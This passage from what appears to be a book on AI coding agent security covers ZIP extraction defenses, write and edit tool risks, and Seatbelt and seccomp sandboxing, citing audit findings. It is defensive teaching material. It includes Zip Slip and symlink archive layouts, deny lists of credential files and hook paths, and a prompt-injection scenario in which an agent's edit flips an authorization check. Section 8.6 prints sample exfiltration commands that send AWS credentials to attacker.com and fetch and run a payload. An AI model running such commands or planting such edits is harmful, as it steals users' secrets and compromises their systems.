ZIP files deserve special attention because they combine multiple file system attack vectors into a single deliverable package. The Claude Code audit rated symlink-based path traversal in ZIP extraction as HIGH severity (CVSS 7.5, CWE-22).

The Zip Slip Attack

Zip Slip exploits the fact that ZIP archives can contain entries with relative path components:

Archive contents:
  src/index.ts           (normal file)
  src/utils.ts           (normal file)
  ../../../../.bashrc    (path traversal entry)

When extracted naively, the traversal entry writes to ../../../../.bashrc relative to the extraction directory -- potentially overwriting the user's shell configuration.

The defense:

function safeExtract(
  zipEntry: ZipEntry, 
  targetDir: string
): string {
  const fullPath = resolve(targetDir, zipEntry.path);

  // Containment check: resolved path must be inside target directory
  if (!fullPath.startsWith(targetDir + sep) && fullPath !== targetDir) {
    throw new SecurityError(
      `Zip entry "${zipEntry.path}" escapes target directory`
    );
  }

  return fullPath;
}

Symlink Entries in ZIP Archives

The more sophisticated attack uses ZIP entries that create symlinks:

Archive contents:
  config/             (directory)
  config/link         (symlink → /etc/shadow)
  config/link/data    (file — follows the symlink!)

When extracted, config/link becomes a symlink pointing to /etc/shadow. Subsequent writes to config/link/data follow the symlink and write to /etc/shadow.

Claude Code's audit finding (Finding 4, CVSS 7.5):

ZIP extraction validates against '..' path traversal (containsPathTraversal check) but symlink targets within ZIP archives are followed without validating that resolved paths remain within the extraction root directory. A crafted ZIP with symlinks pointing to paths outside the extraction directory (e.g., ~/.ssh/authorized_keys) could write files to arbitrary locations.

The data flow: Malicious ZIP → extract → symlink followed → write outside extraction directory.

The defense:

function safeExtractWithSymlinkProtection(
  zipEntry: ZipEntry,
  targetDir: string
): void {
  const fullPath = resolve(targetDir, zipEntry.path);

  // Check 1: Path traversal
  if (!fullPath.startsWith(targetDir + sep)) {
    throw new SecurityError('Path traversal detected');
  }

  if (zipEntry.isSymlink) {
    // Check 2: Symlink target must resolve inside target directory
    const symlinkTarget = resolve(dirname(fullPath), zipEntry.linkTarget);
    if (!symlinkTarget.startsWith(targetDir + sep)) {
      throw new SecurityError(
        `Symlink target "${zipEntry.linkTarget}" escapes target directory`
      );
    }
  }

  // Check 3: After creating any symlink, verify with realpath
  if (existsSync(fullPath)) {
    const canonicalPath = realpathSync(fullPath);
    if (!canonicalPath.startsWith(realpathSync(targetDir) + sep)) {
      unlinkSync(fullPath); // Remove the dangerous symlink
      throw new SecurityError('Symlink resolved outside target directory');
    }
  }
}

ZIP Bomb Detection

A ZIP bomb uses compression ratios to create archives that expand to enormous sizes:

Archive Size Extracted Size Compression Ratio
42 KB 4.5 PB (Petabytes) 106 billion : 1
10 MB 281 TB 28 million : 1
1 MB 1 GB 1,000 : 1

The 42.zip "zip of doom" is the classic example: 42 kilobytes that expand to 4.5 petabytes through nested compression layers.

Defense layers:

interface ZipExtractionLimits {
  maxTotalSize: number;        // Total extracted size (e.g., 1 GB)
  maxEntrySize: number;        // Single entry size (e.g., 100 MB)
  maxEntryCount: number;       // Total number of entries (e.g., 10,000)
  maxCompressionRatio: number; // Ratio check (e.g., 100:1)
  maxDepth: number;            // Nesting depth for recursive ZIPs (e.g., 2)
}

function checkZipBomb(
  entry: ZipEntry, 
  limits: ZipExtractionLimits,
  cumulativeSize: number
): void {
  // Check individual entry size
  if (entry.uncompressedSize > limits.maxEntrySize) {
    throw new SecurityError(`Entry exceeds size limit: ${entry.path}`);
  }

  // Check cumulative extracted size
  if (cumulativeSize + entry.uncompressedSize > limits.maxTotalSize) {
    throw new SecurityError('Total extraction size exceeds limit');
  }

  // Check compression ratio
  if (entry.compressedSize > 0) {
    const ratio = entry.uncompressedSize / entry.compressedSize;
    if (ratio > limits.maxCompressionRatio) {
      throw new SecurityError(`Suspicious compression ratio: ${ratio}`);
    }
  }
}

Claude Code's audit (Finding 25, MEDIUM) noted that ZIP bomb detection only occurs during initial extraction, not during streaming decompression. A bomb that passes initial ratio checks but expands exponentially during streaming could exhaust disk space.

7.7 Write Tool Security

The Write tool creates or overwrites files. Its security concerns are the inverse of the Read tool: instead of information disclosure, the risk is data destruction, config poisoning, and persistence installation.

Write Validation Pipeline

graph TD
    INPUT["file_path + content<br/>from model"] --> ABS["Resolve to absolute path"]
    ABS --> CANON["Canonicalize<br/>(resolve symlinks)"]
    CANON --> DENY["Check deny rules"]
    DENY -->|"Denied"| BLOCK["Permission denied"]
    DENY -->|"Allowed"| PERM["Permission mode check"]
    PERM -->|"auto: classifier"| CLASS["AI Classifier<br/>evaluates"]
    PERM -->|"default: ask"| ASK["Prompt user"]
    PERM -->|"bypass: allow"| WRITE
    CLASS -->|"Allow"| WRITE["Atomic write"]
    ASK -->|"Approved"| WRITE

    WRITE --> VERIFY["Post-write<br/>verification"]

    style BLOCK fill:#8b0000,color:#fff
    style WRITE fill:#2d6a2d,color:#fff

Critical Write Targets

Some file paths, if written, have outsized impact:

Path Impact If Written
~/.ssh/authorized_keys Remote access to the machine
~/.bashrc, ~/.zshrc Code execution on every shell open
~/.gitconfig Git hook execution on every git operation
.git/hooks/pre-commit Code execution on every commit
~/.claude/settings.json AI agent configuration poisoning
package.json (scripts) Code execution on npm install
Makefile, CMakeLists.txt Code execution on build
.github/workflows/*.yml CI/CD pipeline execution

The sandbox (Chapter 8) restricts writes to the project directory and temp directories. But several of these dangerous targets are inside the project directory: .git/hooks/, package.json, CI/CD configurations. The permission system must provide the additional layer -- the sandbox alone is insufficient for write targets that are dangerous by content rather than by location.

Persistence Through Write Operations

The most dangerous write targets are those that achieve persistence -- the malicious content executes not just once, but every time a certain event occurs:

graph TD
    WRITE["Malicious Write"] --> T1["Git Hooks<br/>(.git/hooks/pre-commit)"]
    WRITE --> T2["Shell Config<br/>(~/.bashrc, ~/.zshrc)"]
    WRITE --> T3["Package Scripts<br/>(package.json scripts)"]
    WRITE --> T4["CI/CD Configs<br/>(.github/workflows/)"]
    WRITE --> T5["Cron/Launch Agent<br/>(~/Library/LaunchAgents/)"]

    T1 --> E1["Executes on<br/>every git commit"]
    T2 --> E2["Executes on<br/>every shell open"]
    T3 --> E3["Executes on<br/>npm install/test/build"]
    T4 --> E4["Executes on<br/>every push/PR"]
    T5 --> E5["Executes on<br/>schedule or login"]

    style WRITE fill:#8b0000,color:#fff
    style E1 fill:#cc4422,color:#fff
    style E2 fill:#cc4422,color:#fff

A write to .git/hooks/pre-commit is particularly insidious: the hook executes on every git commit, which the AI agent itself performs frequently. An attacker who poisons the pre-commit hook through a file write gets code execution every time the agent commits code -- a self-reinforcing loop.

Defense: Maintain a separate deny-write list for high-impact project paths:

const DANGEROUS_WRITE_TARGETS = [
  '.git/hooks/**',        // Git hooks - arbitrary code execution
  '.github/workflows/**', // CI/CD pipelines
  '.gitlab-ci.yml',       // GitLab CI
  'Jenkinsfile',          // Jenkins pipelines
  '.husky/**',            // Husky git hooks
  'Makefile',             // Build system (conditional)
  'Dockerfile',           // Container definition (conditional)
];

function isHighImpactWriteTarget(relativePath: string): boolean {
  return DANGEROUS_WRITE_TARGETS.some(pattern => 
    minimatch(relativePath, pattern)
  );
}

7.8 The Edit Tool: Surgical Modification Risks

The Edit tool modifies specific portions of existing files -- it replaces an old_string with a new_string. This surgical precision creates a unique attack vector: unlike the Write tool (which replaces entire files and is obviously destructive), the Edit tool can make subtle modifications that are difficult to detect.

Subtle Code Injection Through Edits

An AI agent influenced by prompt injection could make edits that appear to be normal code changes but introduce vulnerabilities:

// Benign-looking edit: "updating the authentication check"
// old_string:
if (user.isAuthenticated && user.hasRole('admin')) {

// new_string:  
if (user.isAuthenticated || user.hasRole('admin')) {
  // Changed && to || — now ANY authenticated user is admin

The change is a single character (&& to ||) that fundamentally alters the authorization logic. In a code review, this could easily be missed among dozens of legitimate changes.

Defense considerations:

  1. Diff highlighting in permission prompts: When the Edit tool requires permission, show the exact diff with changed characters highlighted
  2. Semantic analysis for security-sensitive patterns: Flag edits that modify authentication, authorization, or cryptographic operations
  3. Post-edit verification hooks: Run linters and static analysis on modified files to detect introduced vulnerabilities

7.9 Cross-Platform Path Security Considerations

File path security behaves differently across operating systems. AI agents that target multiple platforms must handle each platform's quirks:

Issue macOS Linux Windows
Case sensitivity Case-insensitive (HFS+) Case-sensitive Case-insensitive (NTFS)
Path separator / / \ (also accepts /)
Symlinks require privilege No No Yes (SeCreateSymbolicLinkPrivilege)
Max path length 1024 bytes 4096 bytes 260 chars (or 32,767 with prefix)
Alternate data streams No No Yes (file.txt:stream)
Reserved names None None CON, PRN, AUX, NUL, COM1-9, LPT1-9
Unicode normalization NFD (decomposed) None (bytes) NFC (composed)

The Unicode normalization difference between macOS and Linux deserves special attention. macOS decomposes Unicode characters (NFD), so the file name cafe\u0301 (cafe + combining accent) and caf\u00e9 (precomposed) refer to the same file on macOS but different files on Linux. A deny rule matching one form does not necessarily match the other on cross-platform deployments.

Windows alternate data streams are a particularly dangerous edge case. On NTFS, file.txt:hidden creates a hidden data stream attached to file.txt. A path validation that checks file.txt may not detect that :hidden contains injected content. AI agents running on Windows must strip or reject paths containing : after the drive letter.

7.10 Designing File System Security for AI Agents

The lessons from production systems yield design principles for any AI agent that interacts with the filesystem:

The lessons from production systems yield design principles for any AI agent that interacts with the filesystem:

Principle 1: Canonicalize Before Every Check

Every file path must be resolved to its canonical form (absolute path with all symlinks resolved) before any access control decision. Paths that cannot be canonicalized (broken symlinks for read operations, non-existent parent directories for write operations) should be handled explicitly, not silently passed through.

Principle 2: Use Deny Lists for Sensitive Files, Sandboxing for Everything Else

Deny lists target specific high-value files (credentials, SSH keys, configuration). Sandboxing (Chapter 8) provides the broad boundary (project directory only). Neither is sufficient alone: deny lists can be incomplete, and sandboxes allow all writes within the project directory -- including dangerous targets like .git/hooks/.

Principle 3: Validate ZIP Contents Before Extraction

ZIP extraction must validate every entry against path traversal, symlink targets, file sizes, compression ratios, and entry counts before writing any file to disk. Post-extraction validation (checking files after they have been written) is too late -- the damage (symlink creation, file overwrite) has already occurred.

Principle 4: Use Atomic Operations for Security-Sensitive Writes

Any write operation that involves security-relevant state (credentials, permissions, configuration) must use atomic write patterns: create with restrictive permissions, then rename into place. The write-then-chmod pattern leaves a TOCTOU window that attackers can exploit.

Principle 5: Treat the AI Model as an Untrusted Path Source

The AI model generates paths based on its understanding of the user's request, file contents it has read, and external data it has received. Any of these sources can contain path injection attempts. The path validation pipeline must treat every model-generated path with the same suspicion as user input in a web application -- because that is exactly what it is.

7.11 Key Takeaways

File system security in AI agents centers on one problem: ensuring that the file actually accessed matches the file the security system authorized. Path traversal, symlink attacks, and TOCTOU races each exploit a different gap between authorization and access.

The canonical path defense -- resolving all symlinks and normalizing all path components before access control decisions -- is necessary but not sufficient. TOCTOU races can modify the filesystem between canonicalization and access. ZIP extraction introduces batch file creation where each entry must be individually validated against traversal, symlink escape, and resource exhaustion. Write operations to project-internal files (.git/hooks/, CI/CD configs, build scripts) are as dangerous as writes outside the project.

As discussed in Chapter 6, the permission system controls which file operations are allowed. This chapter showed that even allowed operations can be redirected to unintended targets through path manipulation. The next chapter examines the final defense layer: process-level sandboxing that constrains what file operations a command can actually perform at the kernel level, regardless of what the permission system authorized.

Chapter 8: Sandbox and Process Isolation

Every security layer discussed in the preceding chapters -- the command parser (Chapter 5), the permission system (Chapter 6), the path validation pipeline (Chapter 7) -- operates at analysis time, before the command or file operation executes. Analysis can be evaded, classifiers can be fooled, and runtime conditions can differ from parse-time assumptions. The sandbox is the last line of defense: it constrains what a process can actually do at execution time, regardless of what any prior layer concluded about its safety.

This chapter examines process isolation for AI agent tool execution: filesystem sandboxing that restricts read/write access at the kernel level, macOS sandbox-exec (Seatbelt) profiles, Linux seccomp-bpf syscall filtering, resource limits that prevent denial-of-service through runaway processes, and the critical gaps that remain in current production systems. We close with a comparative analysis of next-generation sandboxing technologies -- gVisor, Firecracker, and WebAssembly -- and their applicability to AI agent workloads.

8.1 Why Sandboxing Is Non-Negotiable

Every prior security layer has known failure modes:

Layer Known Failure Mode
Command parser Cannot resolve runtime values (variables, aliases, PATH)
Command classifier Cannot analyze encoded payloads inside heredocs or interpreter arguments
Pattern matcher Incomplete database; novel attacks not covered
Permission system User can approve dangerous commands; classifier can be fooled
Path validator TOCTOU races between check and access
AI classifier Subject to prompt injection through conversation context

The sandbox does not analyze commands. It does not classify intent. It does not trust any prior decision. It restricts the operating system capabilities available to the executed process. If every upstream layer fails and a destructive command reaches execution, the sandbox limits the blast radius.

This is the defining property of defense-in-depth: the sandbox's security contribution is independent of every other layer's correctness. A bug in the parser does not weaken the sandbox. A bypass of the classifier does not affect the sandbox. The sandbox operates at the OS kernel level -- below the abstraction layer that upstream defenses and attacker evasion techniques manipulate.

graph TD
    subgraph "Defense-in-Depth Stack"
        L1["Layer 1: Hardcoded Block List"]
        L2["Layer 2: Command Parser + Classifier"]
        L3["Layer 3: Permission System"]
        L4["Layer 4: Path Validation"]
        L5["Layer 5: Process Sandbox<br/>(kernel enforcement)"]
        L6["Layer 6: Resource Limits<br/>(timeout, memory, fd)"]
    end

    L1 --> L2 --> L3 --> L4 --> L5 --> L6

    ATK["Attacker bypasses<br/>Layers 1-4"] -.->|"Still blocked by"| L5

    style L5 fill:#2d6a2d,color:#fff
    style L6 fill:#2d6a2d,color:#fff
    style ATK fill:#8b0000,color:#fff

8.2 Filesystem Sandboxing Principles

The most important sandbox restriction is controlling which files a command can read and write. The filesystem sandbox operates on four principles:

Principle 1: Write Restriction to Project Directory

Commands can only write to the project directory and system-designated temporary directories. Writes to any other path are blocked at the kernel level:

Allowed write paths:
  /Users/dev/project/          (project root)
  /tmp/                        (system temporary)
  /private/tmp/                (macOS temporary alias)
  /var/folders/                (macOS per-user temporary)

Denied write paths (everything else):
  /Users/dev/.ssh/             (SSH keys)
  /Users/dev/.aws/             (AWS credentials)
  /Users/dev/.gnupg/           (GPG keys)
  /Users/dev/.kube/            (Kubernetes config)
  /etc/                        (system configuration)
  /usr/                        (system binaries)

Why write restriction matters more than read restriction: A command that reads /etc/passwd leaks information but does not cause permanent damage. A command that writes to /etc/passwd can create backdoor accounts or brick the system. Write restriction prevents the highest-severity attacks -- filesystem destruction, persistence installation, credential modification -- regardless of how the command was classified.

Principle 2: Broad Read Access with Specific Denials

Commands need to read project files, system libraries, language runtimes, and tool binaries. Restricting reads too aggressively breaks legitimate operations:

# This legitimate command reads from multiple locations:
python3 -m pytest tests/
# Reads: /usr/bin/python3, /usr/lib/python3/, site-packages/,
#        project tests/, project source code

The pragmatic approach: allow reads broadly, deny reads to specific sensitive files.

Path Contains Risk If Read
~/.ssh/id_rsa, ~/.ssh/id_ed25519 SSH private keys Remote access compromise
~/.aws/credentials AWS access keys Cloud infrastructure access
~/.kube/config Kubernetes tokens Container orchestration access
.env, .env.production Application secrets API keys, database passwords
~/.gnupg/private-keys-v1.d/ GPG private keys Code signing compromise
/etc/shadow Password hashes Offline password cracking

Principle 3: Deny Overrides Allow

When write-allow and write-deny rules conflict, deny wins. A deny rule for .env inside the project directory overrides the broad project-directory allow. This is the same deny-first evaluation order used in the permission system (Chapter 6), applied at the kernel level.

Principle 4: Path Canonicalization Before Enforcement

Paths are resolved to their canonical form before sandbox rules are applied. This prevents traversal attacks at the sandbox level, complementing the path validation described in Chapter 7. Symlink resolution at the kernel level uses the file's actual inode, not the path string, eliminating the TOCTOU window that plagues user-space path validation.

8.3 macOS Sandbox: Seatbelt Profiles

On macOS, process-level sandboxing uses the sandbox-exec system (Seatbelt). Seatbelt profiles are written in a Scheme-like DSL and compiled to kernel-level enforcement rules in XNU, the macOS kernel.

Profile Structure

;; AI Agent Sandbox Profile (conceptual)
(version 1)

;; Default deny — block everything not explicitly allowed
(deny default)

;; Process execution — must be able to run commands
(allow process-exec)
(allow process-fork)

;; File reads — broadly permitted for development tools
(allow file-read*
  (subpath "/usr")              ; System binaries and libraries
  (subpath "/bin")              ; Core utilities  
  (subpath "/Library")          ; macOS frameworks
  (subpath "/System")           ; System frameworks
  (subpath "/Applications")     ; Installed applications
  (subpath "/opt")              ; Homebrew packages
  (subpath PROJECT_ROOT))       ; Project directory

;; File writes — restricted to project and temp
(allow file-write*
  (subpath PROJECT_ROOT)        ; Project directory
  (subpath "/tmp")              ; System temp
  (subpath "/private/tmp")      ; macOS temp alias
  (subpath "/var/folders"))     ; Per-user temp

;; Deny writes to sensitive project paths
(deny file-write*
  (subpath (string-append PROJECT_ROOT "/.env"))
  (subpath (string-append PROJECT_ROOT "/.git/hooks")))

;; Deny reads to credential files
(deny file-read*
  (subpath (string-append HOME "/.ssh"))
  (subpath (string-append HOME "/.aws"))
  (subpath (string-append HOME "/.gnupg"))
  (literal "/etc/shadow"))

;; Network — allow localhost only
(allow network*
  (local ip "localhost:*")
  (local ip "127.0.0.1:*")
  (local ip "[::1]:*"))

;; Block cloud metadata endpoints
(deny network-outbound
  (remote ip "169.254.169.254:*"))  ; AWS/GCP/Azure IMDS

;; Mach IPC — required for macOS services
(allow mach-lookup
  (global-name "com.apple.system.logger")
  (global-name "com.apple.CoreServices.coreservicesd"))

;; Sysctl — allow read, deny write
(allow sysctl-read)
(deny sysctl-write)

Security Properties

Kernel enforcement. Seatbelt rules are enforced by XNU. A sandboxed process cannot escape by manipulating user-space libraries, changing environment variables, or spawning child processes.

Profile inheritance. When a sandboxed command spawns a child process (e.g., make spawning gcc), the child inherits the parent's sandbox restrictions. This prevents sandbox escape through process spawning.

Deny-default posture. The profile starts with (deny default). New capabilities must be explicitly added, not accidentally inherited.

Seatbelt Weaknesses

Weakness Impact Mitigation
No network content filtering Sandbox allows/denies network access but cannot inspect traffic content Use application-level network controls
Limited IPC control Mach port access difficult to restrict precisely Allow only known-required global names
Deprecated API Apple has deprecated sandbox-exec for third parties Migrate to App Sandbox or Endpoint Security framework
Profile complexity Overly restrictive profiles break legitimate tools Extensive testing with real development workflows
No memory protection Cannot restrict memory allocation or shared memory access Use resource limits (Section 8.5)

The deprecation issue is significant. Apple has deprecated sandbox-exec for third-party applications, recommending the App Sandbox instead. However, App Sandbox requires entitlements embedded in code-signed binaries, which is not practical for sandboxing arbitrary shell commands. Production AI agents on macOS must currently use the deprecated API or implement custom enforcement.

8.4 Linux Sandbox: seccomp-bpf

On Linux, the equivalent kernel-level enforcement uses seccomp-bpf (Secure Computing with Berkeley Packet Filter). seccomp-bpf allows a process to install a filter that restricts which system calls it can make.

seccomp-bpf Architecture

graph TD
    PROC["Sandboxed Process"] -->|"syscall"| FILTER["seccomp-bpf Filter<br/>(in kernel)"]
    FILTER -->|"ALLOW"| KERNEL["Kernel executes<br/>syscall normally"]
    FILTER -->|"KILL"| SIGKILL["Process terminated<br/>immediately"]
    FILTER -->|"ERRNO"| ERR["Syscall returns<br/>-1 with errno"]
    FILTER -->|"TRAP"| SIGNAL["SIGSYS signal<br/>sent to process"]
    FILTER -->|"LOG"| LOG["Syscall logged<br/>but allowed"]

    style FILTER fill:#ccaa22,color:#000
    style SIGKILL fill:#8b0000,color:#fff
    style KERNEL fill:#2d6a2d,color:#fff

Profile for AI Agent Tool Execution

// Conceptual seccomp-bpf filter for AI agent commands
// In practice, implemented via libseccomp for portability

#include <seccomp.h>

scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL_PROCESS); // Default: kill

// Allow basic process operations
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(close), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fstat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mmap), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(mprotect), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(munmap), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);

// Allow file operations (with path restriction via other mechanisms)
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(stat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(lstat), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(readlink), 0);

// Allow process management
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(fork), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(execve), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(wait4), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

// DENY dangerous syscalls explicitly
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(ptrace), 0);   // No debugging
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(mount), 0);    // No mounting
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(reboot), 0);   // No reboot
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(swapon), 0);   // No swap control
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EPERM), SCMP_SYS(init_module), 0); // No kernel modules

// Network: allow only local connections
// (seccomp-bpf can filter connect() arguments but this is complex)
// Most implementations combine seccomp with network namespaces

seccomp_load(ctx); // Install filter (irreversible)

Key property: seccomp_load() is irreversible. Once a seccomp filter is installed, the process cannot remove or weaken it. Even if an attacker achieves code execution within the sandboxed process, they cannot escape the seccomp restrictions without a kernel vulnerability.

seccomp-bpf vs Seatbelt Comparison

Property macOS Seatbelt Linux seccomp-bpf
Enforcement level Kernel (XNU) Kernel (Linux)
Filter granularity Path-based file rules Syscall number + args
Path filtering Native (subpath, literal) Requires Landlock LSM
Network filtering IP-based rules Requires network namespaces
Profile language Scheme-like DSL BPF bytecode (via libseccomp)
Profile inheritance Automatic to children Automatic to children
Reversibility Irreversible Irreversible
Ecosystem support Deprecated for 3rd party Widely used (Docker, Chrome, etc.)

The Linux path restriction gap: seccomp-bpf operates at the syscall level -- it can allow or deny openat() calls, but it cannot natively restrict which paths openat() can access. Path-based restrictions on Linux require either:

  1. Landlock LSM (Linux 5.13+): A newer security module that provides path-based access control similar to Seatbelt
  2. Mount namespaces: Create a restricted filesystem view using unshare(CLONE_NEWNS) and bind mounts
  3. User namespaces: Map the process to an unprivileged user with no access outside the project directory

Production AI agents on Linux should combine seccomp-bpf (for syscall restriction) with Landlock or mount namespaces (for path restriction) to achieve equivalent security to macOS Seatbelt.

8.5 Resource Limits

Sandboxing restricts what a process can access. Resource limits restrict how much of the system a process can consume. Without resource limits, a sandboxed process can still deny service by exhausting CPU, memory, file descriptors, or disk space.

Timeout Management

Every command executed by an AI agent must have a timeout. Without timeouts, a process that enters an infinite loop (intentional or accidental) blocks the agent indefinitely.

import { spawn } from 'child_process';

interface ExecutionLimits {
  timeoutMs: number;      // Max wall-clock time (default: 120_000)
  maxOutputBytes: number; // Max stdout+stderr (default: 1_048_576)
}

function executeWithLimits(
  command: string,
  limits: ExecutionLimits
): Promise<ExecutionResult> {
  return new Promise((resolve, reject) => {
    const proc = spawn('bash', ['-c', command], {
      timeout: limits.timeoutMs,
      maxBuffer: limits.maxOutputBytes,
    });

    let stdout = '';
    let stderr = '';
    let outputBytes = 0;

    proc.stdout.on('data', (chunk: Buffer) => {
      outputBytes += chunk.length;
      if (outputBytes <= limits.maxOutputBytes) {
        stdout += chunk.toString();
      }
    });

    proc.stderr.on('data', (chunk: Buffer) => {
      outputBytes += chunk.length;
      if (outputBytes <= limits.maxOutputBytes) {
        stderr += chunk.toString();
      }
    });

    proc.on('exit', (code, signal) => {
      resolve({
        exitCode: code,
        signal,
        stdout: stdout.slice(-limits.maxOutputBytes), // Keep tail
        stderr,
        timedOut: signal === 'SIGTERM',
        truncated: outputBytes > limits.maxOutputBytes,
      });
    });
  });
}

Process Group Management

When a command is killed (timeout, manual cancel), all child processes must also be killed. Without process group management, a timed-out parent leaves orphaned children consuming resources:

const proc = spawn('bash', ['-c', command], {
  detached: true, // Create new process group
});

// Kill the entire process group
function killProcessGroup(pid: number): void {
  try {
    process.kill(-pid, 'SIGTERM'); // Negative PID = process group
    setTimeout(() => {
      try {
        process.kill(-pid, 'SIGKILL'); // Force kill after grace period
      } catch {
        // Process group already exited
      }
    }, 5000);
  } catch {
    // Process group already exited
  }
}

Resource Limit Summary

Resource Limit Enforcement Failure Mode If Missing
Wall-clock time 120s default Process timeout Infinite loops block agent
CPU time Per-process rlimit setrlimit(RLIMIT_CPU) CPU exhaustion
Memory Per-process rlimit setrlimit(RLIMIT_AS) OOM kills random processes
File descriptors Per-process rlimit setrlimit(RLIMIT_NOFILE) FD exhaustion blocks I/O
Output size 1MB default Stream byte counting Context flooding (Chapter 5 of this book, also see reference material)
Process count Per-user rlimit setrlimit(RLIMIT_NPROC) Fork bombs
File size Per-process rlimit setrlimit(RLIMIT_FSIZE) Disk exhaustion

8.6 The Network Isolation Gap

The most significant gap in current AI agent sandboxing is network access. Most production systems allow outbound network connections from sandboxed commands because legitimate tools require network access:

# Legitimate commands requiring network:
git clone https://github.com/user/repo.git
npm install
pip install -r requirements.txt
cargo build  # Downloads crates from crates.io
curl https://api.github.com/repos  # API queries

But unrestricted outbound network access enables data exfiltration:

# Exfiltration through legitimate-looking commands:
curl -X POST https://attacker.com/exfil -d "$(cat ~/.aws/credentials)"
git push https://attacker.com/repo.git  # Push project to attacker's server
wget https://attacker.com/malware -O /tmp/payload && /tmp/payload

Current State of Network Restrictions

Framework Network Restriction Implementation
Claude Code Block cloud metadata (169.254.169.254) Seatbelt/seccomp rule
Docker default Bridge network, no host network Network namespace
Chrome sandbox Per-origin isolation Seccomp + namespace
Most AI agents No restriction N/A

Blocking the cloud metadata endpoint (169.254.169.254) prevents SSRF attacks against AWS IMDS, GCP metadata, and Azure IMDS. But it does not prevent exfiltration to arbitrary internet endpoints.

Proposed Network Isolation Architecture

graph TD
    CMD["Sandboxed Command"] --> PROXY["Network Proxy<br/>(localhost only)"]
    PROXY --> FILTER["Domain Allowlist<br/>Filter"]
    FILTER -->|"Allowed"| INTERNET["Internet"]
    FILTER -->|"Blocked"| DROP["Connection<br/>Dropped"]

    FILTER -.- ALLOW["Allowlist:<br/>github.com<br/>npmjs.org<br/>crates.io<br/>pypi.org<br/>registry.npmjs.org"]

    FILTER -.- BLOCK["Blocklist:<br/>*.attacker.com<br/>169.254.169.254<br/>internal-*.corp.net"]

    style DROP fill:#8b0000,color:#fff
    style INTERNET fill:#2d6a2d,color:#fff

The implementation requires:

  1. Network namespace isolation: The sandboxed process runs in a separate network namespace with only a loopback interface
  2. Local proxy: A transparent proxy running in the host namespace, accessible via the loopback interface
  3. Domain allowlist: The proxy resolves domain names and checks against an allowlist before forwarding traffic
  4. TLS inspection: For HTTPS traffic, the proxy must either terminate TLS (requires trust certificate injection) or inspect SNI headers

This is complex to implement correctly and introduces latency. No major AI CLI agent has deployed full network isolation in production as of early 2026. The cloud metadata block is the pragmatic minimum.

8.7 Comparing Next-Generation Sandboxing Technologies

Current AI agent sandboxing uses OS-native mechanisms (Seatbelt, seccomp). Next-generation technologies offer stronger isolation at different cost/complexity tradeoffs:

gVisor

Google's gVisor is a container runtime that implements a user-space Linux kernel. Instead of system calls reaching the host kernel, they are intercepted by gVisor's Sentry process, which reimplements Linux syscall semantics.

Strengths for AI agents: - Stronger isolation than seccomp alone (kernel vulnerability in gVisor does not compromise host) - Compatible with existing Linux binaries (no code changes) - Per-sandbox resource accounting

Weaknesses: - Performance overhead: 2-10x slower for syscall-heavy workloads - Incomplete syscall coverage: ~350 of ~450 Linux syscalls implemented - Requires container infrastructure (OCI runtime)

Verdict for AI agents: Suitable for CI/CD and server-side agent execution. Too heavy for developer workstations where latency matters.

Firecracker

Amazon's Firecracker is a micro-VM manager that creates lightweight virtual machines in ~125ms. Each VM runs its own Linux kernel with hardware-enforced isolation.

Strengths for AI agents: - Strongest isolation (hardware-level via KVM) - Full Linux environment inside each VM - Sub-second startup time - Memory-efficient (5MB base overhead per VM)

Weaknesses: - Requires KVM support (Linux host with virtualization) - No macOS support (KVM is Linux-only; macOS has Hypervisor.framework but no Firecracker support) - Filesystem sharing between host and VM adds complexity - Network configuration per VM

Verdict for AI agents: Excellent for multi-tenant server-side agent execution (multiple users sharing infrastructure). Not practical for single-developer workstation use.

WebAssembly (WASM)

WebAssembly provides a sandboxed execution environment with capability-based security (WASI). WASM modules run in a memory-safe virtual machine with explicit imports for every capability.

Strengths for AI agents: - Memory-safe execution (no buffer overflows, no arbitrary memory access) - Capability-based: modules can only access explicitly granted resources - Cross-platform (macOS, Linux, Windows) - Fast startup (~1ms for pre-compiled modules) - Small runtime footprint

Weaknesses: - Limited tool support: most shell commands are not compiled to WASM - WASI filesystem support is still maturing - No native process spawning (cannot run bash -c inside WASM) - Performance overhead for I/O-heavy workloads

Verdict for AI agents: Ideal for sandboxing specific tool implementations (JSON parsers, code formatters, linters) but not for general shell command execution. The inability to run arbitrary shell commands inside WASM makes it unsuitable as the primary sandbox for CLI agents.

8.8 The Subagent Isolation Problem

Multi-agent architectures (Part V of this book) introduce a sandboxing challenge that single-agent systems do not face: isolating agents from each other, not just from the system.

Claude Code's audit (CVSS 7.8, CWE-269) identified that subagents execute in the same Node.js process as the parent CLI:

Subagents share AppState, tool pools, and environment. A malicious or compromised subagent has full access to all parent resources including filesystem, network, and credential storage. The only isolation is tool-name filtering, which is advisory not enforced at the process level.

The audit's recommended fix:

  1. Process-level isolation using child_process.fork() with IPC communication
  2. seccomp/sandbox-exec profiles applied to child processes to restrict syscalls
